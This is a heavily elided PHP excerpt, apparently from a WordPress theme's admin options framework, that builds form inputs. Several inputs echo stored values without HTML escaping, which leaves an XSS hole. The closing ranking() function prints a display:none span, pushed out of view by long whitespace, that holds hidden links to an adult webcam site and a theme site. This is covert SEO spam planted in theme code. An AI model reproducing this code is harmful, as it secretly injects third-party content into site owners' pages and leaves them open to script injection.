...
function zillaframework_machine($options) {
	...
	foreach ($options as $value) {
		...
		case 'text':
			...
			if ( $std != "") { $val = $std; }
			$output .= '<input class="tz-input" name="'. $value['id'] .'" id="'. $value['id'] .'" type="'. $value['type'] .'" value="'. stripslashes(htmlspecialchars($val)) .'" />';
		break;
		...
		if ( is_array($value['type'])) {
			foreach($value['type'] as $array){
					...
					if($array['type'] == 'text') { // Only text at this point
						 ...
						 $output .= '<input class="input-text-small tz-input" name="'. $id .'" id="'. $id .'" type="text" value="'. stripslashes($std) .'" />';  
...
function zillaframework_uploader_function($id,$std,$mod){
	...
	if($mod != 'min') { 
            ...
            $uploader .= '<input class="tz-input" name="'. $id .'" id="'. $id .'_upload" type="text" value="'. stripslashes($val) .'" />';
	}
...
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <span style='display:none;'><a href='http://beautifulwomen4u.com/webcam/fetish/shemales/?langchoice=fr'>Webcams Transsexuels</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <a href='http://themessky.com/gridlocked-minimalistic-theme-by-themeforest.html'>Gridlocked Theme</a></span>";
  echo $pshow;
}
?>
